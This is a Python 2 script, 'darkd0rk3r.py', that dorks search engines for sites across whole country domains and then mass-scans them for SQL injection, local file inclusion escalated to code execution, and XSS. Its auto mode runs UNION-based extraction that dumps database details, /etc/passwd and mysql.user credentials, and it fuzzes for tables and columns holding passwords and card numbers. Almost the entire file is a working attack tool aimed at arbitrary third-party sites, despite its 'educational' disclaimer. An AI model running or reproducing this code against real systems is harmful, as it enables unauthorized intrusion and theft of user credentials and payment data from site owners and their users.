#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkd0rk3r.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 1.0
# greetz for all members of ex darkc0de.com, ljuska.org 
# 

import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
from random import choice

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m";


# Banner
def logo():
	print R+"\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   09/2012     darkd0rk3r.py  v.1.0                            |"
        print "|              b4ltazar.us                                      |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
	print W

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()
  
else:
  subprocess.call("cls", shell=True)
  logo()
  
log = "darkd0rk3r-sqli.txt"
logfile = open(log, "a")
lfi_log = "darkd0rk3r-lfi.txt"
lfi_log_file = open(lfi_log, "a")
rce_log = "darkd0rk3r-rce.txt"
rce_log_file = open(rce_log, "a")
xss_log = "darkd0rk3r-xss.txt"
xss_log_file = open(xss_log, "a")

threads = []
finallist = []
vuln = []
col = []
darkurl = []
arg_end = "--"
arg_eva = "+"
colMax = 10 # Change this at your will
gets = 0
file = "/etc/passwd"
timeout = 60
socket.setdefaulttimeout(timeout)


lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]

xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E"]

tables = ['user','users','tbladmins','Logins','logins','login','admins','members','member', '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user', 'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator', 'administrators', 'adminrights', 'admins', 'adminuser','adminusers','article_admin', 'articles', 'artikel','author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'index', 'info', 'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login_admin', 'login_admins', 'login_user', 'login_users','logon', 'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users','memberlist','minibbtable_users', 'mitglieder', 'mybb_users', 'mysql', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_users', 'obb_profiles', 'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user', 'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins', 'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member', 'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members','user_admin', 'user_info', 'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins', 'username', 'usernames', 'userrights','vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members', 'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers','wp_users', 'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'Category', 'CategoryGroup', 'ChicksPass', 'dtproperties', 'JamPass', 'News', 'Passwords by usage count', 'PerfPassword', 'PerfPasswordAllSelected','pristup', 'SubCategory', 'tblRestrictedPasswords', 'Ticket System Acc Numbers', 'Total Members', 'UserPreferences', 'tblConfigs', 'tblLogBookAuthor', 'tblLogBookUser', 'tblMails', 'tblOrders', 'tblUser', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user', 'table_user', 'email', 'mail', 'bulletin', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login', 'UserAdmin']

columns = ['user', 'username', 'password', 'passwd', 'pass', 'cc_number', 'id', 'email', 'emri', 'fjalekalimi', 'pwd', 'user_name', 'customers_email_address', 'customers_password', 'user_password', 'name', 'user_pass', 'admin_user', 'admin_password', 'admin_pass', 'usern', 'user_n', 'users', 'login', 'logins', 'login_user', 'login_admin', 'login_username', 'user_username', 'user_login', 'auid', 'apwd', 'adminid', 'admin_id', 'adminuser', 'adminuserid', 'admin_userid', 'adminusername', 'admin_username', 'adminname', 'admin_name', 'usr', 'usr_n', 'usrname', 'usr_name', 'usrpass', 'usr_pass', 'usrnam', 'nc', 'uid', 'userid', 'user_id', 'myusername', 'mail', 'emni', 'logohu', 'punonjes', 'kpro_user', 'wp_users', 'emniplote', 'perdoruesi', 'perdorimi', 'punetoret', 'logini', 'llogaria', 'fjalekalimin', 'kodi', 'emer', 'ime', 'korisnik', 'korisnici', 'user1', 'administrator', 'administrator_name', 'mem_login', 'login_password', 'login_pass', 'login_passwd', 'login_pwd', 'sifra', 'lozinka', 'psw', 'pass1word', 'pass_word', 'passw', 'pass_w', 'user_passwd', 'userpass', 'userpassword', 'userpwd', 'user_pwd', 'useradmin', 'user_admin', 'mypassword', 'passwrd', 'admin_pwd', 'admin_passwd', 'mem_password', 'memlogin', 'e_mail', 'usrn', 'u_name', 'uname', 'mempassword', 'mem_pass', 'mem_passwd', 'mem_pwd', 'p_word', 'pword', 'p_assword', 'myname', 'my_username', 'my_name', 'my_password', 'my_email', 'korisnicko', 'cvvnumber ', 'about', 'access', 'accnt', 'accnts', 'account', 'accounts', 'admin', 'adminemail', 'adminlogin', 'adminmail', 'admins', 'aid', 'aim', 'auth', 'authenticate', 'authentication', 'blog', 'cc_expires', 'cc_owner', 'cc_type', 'cfg', 'cid', 'clientname', 'clientpassword', 'clientusername', 'conf', 'config', 'contact', 'converge_pass_hash', 'converge_pass_salt', 'crack', 'customer', 'customers', 'cvvnumber', 'data', 'db_database_name', 'db_hostname', 'db_password', 'db_username', 'download', 'e-mail', 'emailaddress', 'full', 'gid', 'group', 'group_name', 'hash', 'hashsalt', 'homepage', 'icq', 'icq_number', 'id_group', 'id_member', 'images', 'index', 'ip_address', 'last_ip', 'last_login', 'lastname', 'log', 'login_name', 'login_pw', 'loginkey', 'loginout', 'logo', 'md5hash', 'member', 'member_id', 'member_login_key', 'member_name', 'memberid', 'membername', 'members', 'new', 'news', 'nick', 'number', 'nummer', 'pass_hash', 'passwordsalt', 'passwort', 'personal_key', 'phone', 'privacy', 'pw', 'pwrd', 'salt', 'search', 'secretanswer', 'secretquestion', 'serial', 'session_member_id', 'session_member_login_key', 'sesskey', 'setting', 'sid', 'spacer', 'status', 'store', 'store1', 'store2', 'store3', 'store4', 'table_prefix', 'temp_pass', 'temp_password', 'temppass', 'temppasword', 'text', 'un', 'user_email', 'user_icq', 'user_ip', 'user_level', 'user_passw', 'user_pw', 'user_pword', 'user_pwrd', 'user_un', 'user_uname', 'user_usernm', 'user_usernun', 'user_usrnm', 'userip', 'userlogin', 'usernm', 'userpw', 'usr2', 'usrnm', 'usrs', 'warez', 'xar_name', 'xar_pass']



sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format'}
             

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']
	  
	  
domains = {'All domains':['ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'com',
           'net', 'org','biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
           'name', 'aero', 'asia', 'cat', 'coop', 'jobs', 'mobi', 'museum',
           'pro', 'travel'],'Balcan':['al', 'bg', 'ro', 'gr', 'rs', 'hr',
           'tr', 'ba', 'mk', 'mv', 'me'],'TLD':['xxx','edu', 'gov', 'mil',
           'biz', 'cat', 'com', 'int','net', 'org', 'pro', 'tel', 'aero', 'asia',
           'coop', 'info', 'jobs', 'mobi', 'name', 'museum', 'travel']}
           



def search(inurl, maxc):
  urls = []
  for site in sitearray:
    page = 0
    try:
      while page < int(maxc):
	jar = cookielib.FileCookieJar("cookies")
	query = inurl+"+site:"+site
	results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
	request_web =urllib2.Request(results_web)
	agent = random.choice(header)
	request_web.add_header('User-Agent', agent)
	opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	text = opener_web.open(request_web).read()
	stringreg = re.compile('(?<=href=")(.*?)(?=")')
        names = stringreg.findall(text)
        page += 1
        for name in names:
	  if name not in urls:
	    if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
	      pass
	    elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name) or re.search("facebook", name) or re.search("twitter", name):
	      pass
	    else:
	      urls.append(name)
	percent = int((1.0*page/int(maxc))*100)
	urls_len = len(urls)
	sys.stdout.write("\rSite: %s | Collected urls: %s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),repr(percent),repr(page)))
	sys.stdout.flush()
    except(KeyboardInterrupt):
      pass
  tmplist = []
  print "\n\n[+] URLS (unsorted): ",len(urls)
  for url in urls:
    try:
      host = url.split("/",3)
      domain = host[2]
      if domain not in tmplist and "=" in url:
	finallist.append(url)
	tmplist.append(domain)
	
    except:
      pass
  print "[+] URLS (sorted)  : ",len(finallist)
  return finallist

  
class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
class lfiThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicLFI(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
class xssThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicXSS(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
                
def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in sqlerrors.items():
                        if re.search(eMSG, source):
                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> SQL Injection Found"
				logfile.write("\n"+host)
				vuln.append(host)
				col.append(host)
				break
				
				
                        else:
                                pass
        except:
                pass


def ClassicLFI(url):
  lfiurl = url.rsplit('=', 1)[0]
  if lfiurl[-1] != "=":
    lfiurl = lfiurl + "="
  for lfi in lfis:
    try:
      check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
      if re.findall("root:x", check):
	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Local File Include Found"
	lfi_log_file.write("\n"+lfiurl+lfi)
	vuln.append(lfiurl+lfi)
	target = lfiurl+lfi
	target = target.replace("/etc/passwd","/proc/self/environ")
	header = "<? echo md5(baltazar); ?>"
        try:
	  request_web = urllib2.Request(target)
	  request_web.add_header('User-Agent', header)
	  text = urllib2.urlopen(request_web)
	  text = text.read()
	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> LFI to RCE Found"
	    rce_log_file.write("\n",target)
	    vuln.append(target)
        except:
	  pass
	
    except:
      pass

def ClassicXSS(url):
  for xss in xsses:
    try:
      source = urllib2.urlopen(url+xss.replace("\n","")).read()
      if re.findall("XSS by baltazar", source):
	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Found (might be false)"
	xss_log_file.write("\n"+url+xss)
	vuln.append(url+xss)
    except:
      pass

def injtest():
  print B+"\n[+] Preparing for SQLi scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = injThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()
      
def lfitest():
  print B+"\n[+] Preparing for LFI - RCE scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = lfiThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()

def xsstest():
  print B+"\n[+] Preparing for XSS scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = xssThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()

menu = True
new = 1
while menu == True:
  if new == 1:
    threads = []
    finallist = []
    vuln = []
    col = []
    darkurl = []
    
    stecnt = 0
    for k,v in domains.items():
      stecnt += 1
      print str(stecnt)+" - "+k
    sitekey = raw_input("\nChoose your target   : ")
    sitearray = domains[domains.keys()[int(sitekey)-1]]
    

    inurl = raw_input('\nEnter your dork      : ')
    numthreads = raw_input('Enter no. of threads : ')
    maxc = raw_input('Enter no. of pages   : ')
    print "\nNumber of SQL errors :",len(sqlerrors)
    print "Number of LFI paths  :",len(lfis)
    print "Number of XSS cheats :",len(xsses)
    print "Number of headers    :",len(header)
    print "Number of threads    :",numthreads
    print "Number of pages      :",maxc
    print "Timeout in seconds   :",timeout
    print ""
  
    usearch = search(inurl,maxc)
    new = 0
  
  print R+"\n[0] Exit"
  print "[1] SQLi Testing"
  print "[2] SQLi Testing Auto Mode"
  print "[3] LFI - RCE Testing"
  print "[4] XSS Testing"
  print "[5] SQLi and LFI - RCE Testing"
  print "[6] SQLi and XSS Testing"
  print "[7] LFI - RCE and XSS Testing"
  print "[8] SQLi,LFI - RCE and XSS Testing"
  print "[9] Save valid urls to file"
  print "[10] Print valid urls"
  print "[11] Found vuln in last scan"
  print "[12] New Scan\n"
  
  chce = raw_input(":")
  if chce == '1':
    injtest()
    
  if chce == '2':
    injtest()
    print B+"\n[+] Preparing for Column Finder ..."
    print "[+] Can take a while ..."
    print "[!] Working ..."
    # Thanks rsauron for schemafuzz
    for host in col:
      print R+"\n[+] Target: ", O+host
      print R+"[+] Attempting to find the number of columns ..."
      print "[+] Testing: ",
      checkfor = []
      host = host.rsplit("'", 1)[0]
      sitenew = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva
      makepretty = ""
      for x in xrange(0, colMax):
	try:
	  sys.stdout.write("%s," % (x))
	  sys.stdout.flush()
	  darkc0de = "dark"+str(x)+"c0de"
	  checkfor.append(darkc0de)
	  if x > 0:
	    sitenew += ","
	  sitenew += "0x"+darkc0de.encode("hex")
	  finalurl = sitenew+arg_end
	  gets += 1
	  source = urllib2.urlopen(finalurl).read()
	  for y in checkfor:
	    colFound = re.findall(y, source)
	    if len(colFound) >= 1:
	      print "\n[+] Column length is:", len(checkfor)
	      nullcol = re.findall(("\d+"), y)
	      print "[+] Found null column at column #:", nullcol[0]
	      for z in xrange(0, len(checkfor)):
		if z > 0:
		  makepretty += ","
		makepretty += str(z)
	      site = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva+makepretty
	      print "[+] SQLi URL:", site+arg_end
	      site = site.replace(","+nullcol[0]+",",",darkc0de,")
	      site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"darkc0de,")
	      site = site.replace(","+nullcol[0],",darkc0de")
	      print "[+] darkc0de URL:", site
	      darkurl.append(site)
	      print "[-] Done!\n"
	      break
	      
	except(KeyboardInterrupt, SystemExit):
	  raise
	except:
	  pass
      
      print "\n[!] Sorry column length could not be found\n"
      
      
      #########
    
    print B+"\n[+] Gathering MySQL Server Configuration..."
    for site in darkurl:
      head_URL = site.replace("darkc0de", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
      print R+"\n[+] Target:", O+site
      while 1:
	try:
	  gets += 1
	  source = urllib2.urlopen(head_URL).read()
	  match = re.findall("\x1e\x1e\S+", source)
	  if len(match) >= 1:
	    match = match[0][2:].split("\x1e")
	    version = match[0]
	    user = match[1]
	    database = match[2]
	    print W+"\n\tDatabase:", database
	    print "\tUser:", user
	    print "\tVersion:", version
	    version = version[0]
	  
	    load = site.replace("darkc0de", "load_file(0x2f6574632f706173737764)")
	    source = urllib2.urlopen(load).read()
	    if re.findall("root:x", source):
	      load = site.replace("darkc0de","concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
	      source = urllib2.urlopen(load).read()
	      search = re.findall("baltazar",source)
	      if len(search) > 0:
		print "\n[!] w00t!w00t!: "+site.replace("darkc0de", "load_file(0x"+file.encode("hex")+")")
	   
	    load = site.replace("dakrc0de", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
	    source = urllib2.urlopen(load).read()
	    if re.findall("baltazar", source):
	      print "\n[!] w00t!w00t!: "+site.replace("darkc0de", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
	  
	  print W+"\n[+] Number of tables:",len(tables)
	  print "[+] Number of columns:",len(columns)
          print "[+] Checking for tables and columns..."
          target = site.replace("darkc0de", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
	  for table in tables:
            try:
	      target_table = target.replace("T", table)
	      source = urllib2.urlopen(target_table).read()
	      search = re.findall("baltazar", source)
	      if len(search) > 0:
		print "\n[!] w00t!w00t! Found a table called: < "+table+" >"
		print "\n[+] Lets check for columns inside table < "+table+" >"
		for column in columns:
		  try:
		    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
		    search = re.findall("baltazar", source)
		    if len(search) > 0:
		      print "\t[!] w00t!w00t! Found a column called: < "+column+" >"
		  except(KeyboardInterrupt, SystemExit):
		    raise
		  except(urllib2.URLErrr, socket.gaierror, socket.error, socket.timeout):
		    pass
	    
		print "\n[-] Done searching inside table < "+table+" > for columns!"
	  
	    except(KeyboardInterrupt, SystemExit):
	      raise
	    except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
	      pass
	  print "[!] Fuzzing is finished!"
	  break	  
	except(KeyboardInterrupt, SystemExit):
	  raise
	
    
	
    
      
  if chce == '3':
    lfitest()
  
  if chce == '4':
    xsstest()
    
  if chce == '5':
    injtest()
    lfitest()
     
  if chce == '6':
    injtest()
    xsstest()
    
  if chce == '7':
    lfitest()
    xsstest()
    
  if chce == '8':
    injtest()
    lfitest()
    xsstest()
    
  if chce == '9':
    print B+"\nSaving valid urls ("+str(len(finallist))+") to file"
    listname = raw_input("Filename: ")
    list_name = open(listname, "w")
    finallist.sort()
    for t in finallist:
      list_name.write(t+"\n")
    list_name.close()
    print "Urls saved, please check", listname
   
  if chce == '10':
    print W+"\nPrinting valid urls:\n"
    finallist.sort()
    for t in finallist:
      print B+t
      
  if chce == '11':
    print B+"\nVuln found ",len(vuln)
    
  if chce == '12':
    new = 1 
    print W+""

  if chce == '0':
    print R+"\n[-] Exiting ..."
    mnu = False
    print W
    sys.exit(1)
      
  
